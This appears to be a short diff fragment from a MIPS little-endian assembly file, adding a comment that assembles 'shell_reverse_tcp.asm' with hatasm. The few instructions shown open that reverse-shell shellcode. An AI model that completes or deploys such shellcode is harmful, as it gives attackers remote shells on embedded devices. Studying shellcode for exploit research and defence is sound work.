@@ -1,3 +1,5 @@
+// hatasm -a --arch mipsle -i shell_reverse_tcp.asm
+
 start:
     addiu $t7, $zero, -6
     not $t7, $t7
